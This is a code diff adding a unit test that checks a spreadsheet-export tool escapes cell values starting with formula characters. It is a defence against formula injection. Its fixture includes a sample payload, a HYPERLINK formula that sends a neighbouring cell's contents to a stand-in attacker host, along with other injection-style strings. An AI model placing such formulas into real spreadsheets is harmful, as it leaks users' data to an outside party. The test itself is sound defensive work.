@@ -141,3 +141,18 @@ class TestTool(NudgeCase, TransactionCase):
             self.assertNotIn("make_spreadsheet", names)
         self.assertIn("make_spreadsheet",
                       [tool.name for tool in tools.base.available(self.env(user=self.agent), "agent")])
+
+    def test_a_text_that_starts_like_a_formula_stays_a_text(self):
+        evil = '=HYPERLINK("https://evil.example/?"&B2,"Open")'
+        for value in (evil, "+1 call", "-cmd", "@SUM(A1)", "  =1+1"):
+            content = workbook._cell_content(value, "text")
+            self.assertFalse(content.lstrip().startswith(("=", "+", "-", "@")) and not content.startswith(" "), value)
+            self.assertTrue(content.startswith(" "), value)
+        self.assertEqual(workbook._cell_content("-1,250.5", "money"), "-1250.5", "A number is still a number")
+        self.assertEqual(workbook._cell_content("=SUM(A1)", "number"), " =SUM(A1)", "A number column too")
+        self.assertEqual(workbook._cell_content("Acme", "text"), "Acme")
+        empty = self.env["nudge.spreadsheet"]._empty_spreadsheet_data()
+        data = workbook.build_workbook(empty, [{
+            "name": "Contacts", "columns": [{"label": "=Name", "type": "text"}], "rows": [[evil]], "totals": False}])
+        cells = data["sheets"][0]["cells"]
+        self.assertTrue(cells["A1"].startswith(" ") and cells["A2"].startswith(" "))
